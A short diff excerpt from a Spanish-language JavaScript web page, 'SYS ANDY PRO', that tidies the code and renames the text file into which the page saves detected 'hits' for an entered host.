                 isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
-                
-                // Auto descargar si hay hits
                 const total = HITS[1].length + HITS[2].length + HITS[3].length;
                 if(autoDownload.checked && total > 0) $("saveBtn").click();
             });
@@ -635,13 +931,11 @@
 
         saveBtn.addEventListener('click', () => {
             let out = "=== HITS DETECTADOS EN SYS ANDY PRO ===\n\n";
-            [1,2,3].forEach(id => {
-                HITS[id].forEach(h => { out += h.texto + "\n---------------------\n"; });
-            });
+            [1,2,3].forEach(id => { HITS[id].forEach(h => { out += h.texto + "\n---------------------\n"; }); });
             const blob = new Blob([out], {type:'text/plain;charset=utf-8'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
-            a.download = `Hits_AndyPro_${limpiarHost(hostInput.value)}.txt`;
+            a.download = `Hits_${limpiarHost(hostInput.value)}.txt`;
             document.body.appendChild(a); a.click(); a.remove();
         });
     </script>
